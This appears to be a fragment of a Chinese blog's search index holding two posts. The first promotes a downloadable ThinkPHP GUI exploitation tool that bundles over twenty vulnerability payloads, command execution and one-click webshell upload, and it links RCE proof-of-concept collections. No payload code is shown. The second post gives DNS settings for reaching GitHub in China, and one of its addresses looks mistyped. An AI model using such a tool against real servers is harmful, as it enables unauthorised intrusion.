        <content type="html"><![CDATA[<p>下载地址：<br><a href="https://github.com/bewhale/thinkphp_gui_tools/releases/download/V2.0/ThinkPHP.V2.0.by.jar">ThinkPHP 综合利用工具 V2.0 by 蓝鲸.jar</a></p><p>本项目是采用 JDK8 + javafx 开发的 ThinkPHP 图形化综合利用工具， 参考了其他大佬项目的部分代码。</p><p>JDK8可以直接运行，JDK11 因为去除了javafx这个依赖，需要自己再加上参数加入模块</p><p><code>java -Dfile.encoding="UTF-8" --module-path "C:\Program Files\Java\javafx-sdk-11.0.2\lib" --add-modules "javafx.controls,javafx.fxml,javafx.web" -jar "xxx.jar" </code></p><ul><li>支持大部分ThinkPHP漏洞检测,整合20多个payload</li><li>支持部分漏洞执行命令</li><li>支持单一漏洞批量检测</li><li>支持TP3和TP5自定义路径日志遍历</li><li>支持部分漏洞一键GetShell</li><li>支持设置代理和UA</li></ul><p><img src="https://raw.githubusercontents.com/bewhale/thinkphp_gui_tools/main/img.png"></p><p><img src="https://raw.githubusercontents.com/bewhale/thinkphp_gui_tools/main/img1.png"></p><p><img src="https://raw.githubusercontents.com/bewhale/thinkphp_gui_tools/main/img2.png"></p><h1 id="参考项目"><a href="#参考项目" class="headerlink" title="参考项目"></a>参考项目</h1><p><a href="https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection">https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection</a><br><a href="https://github.com/Lucifer1993/TPscan">https://github.com/Lucifer1993/TPscan</a><br><a href="https://github.com/fupinglee/JavaTools">https://github.com/fupinglee/JavaTools</a><br><a href="https://github.com/xinyu2428/TDOA_RCE">https://github.com/xinyu2428/TDOA_RCE</a>  </p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> thinkphp </tag>
            
            <tag> 图形化 </tag>
            
            <tag> 命令执行 </tag>
            
            <tag> getshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Github部分网站无法访问解决办法</title>
      <link href="posts/7204.html"/>
      <url>posts/7204.html</url>
      
        <content type="html"><![CDATA[<p>国内大部分地方无法访问以下域名</p><ul><li>*.github.io </li><li>raw.githubusercontent.com</li></ul><p>原因大都是是国内运营商DNS污染, ping一些域名可以发现,<br>域名往往被指向了  127.0.0.1, 或者直接提示找不到主机  </p><p>最直接的方法就是挂代理   </p><p>修改本地hosts文件的话，遇到一个新的域名，又要添加一条新纪录，稍显麻烦，</p><p>所有我们直接修改本机的DNS地址，一劳永逸。</p><p>修改完DNS地址后，点击高级查看是否还有其他的DNS地址，删除掉。</p><p>然后打开cmd， 执行 <code>ipconfig /flushdns</code> 清除缓存</p><p>如下图：</p><p><img src="https://raw.githubusercontents.com/bewhale/img/master/img20210707080127.png"></p><p>一些常用的DNS地址：</p><pre class="line-numbers language-none"><code class="language-none">114DNS首选：114.114.114.114备选：114.114.114.115Google DNS8.8.8.88.8.4.4阿里 AliDNS首选：233.5.5.5备选：223.6.6.6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者使用图形化工具来一键测试，修改，不要忘记在高级里面把多余的DNS地址删除掉。</p><p> <a href="https://www.sordum.org/7952/dns-jumper-v2-2/">dns-jumper-v2-2/</a></p>]]></content>
      
      
      <categories>
          
          <category> 经验之谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GitHub </tag>
            
            <tag> DNS污染 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
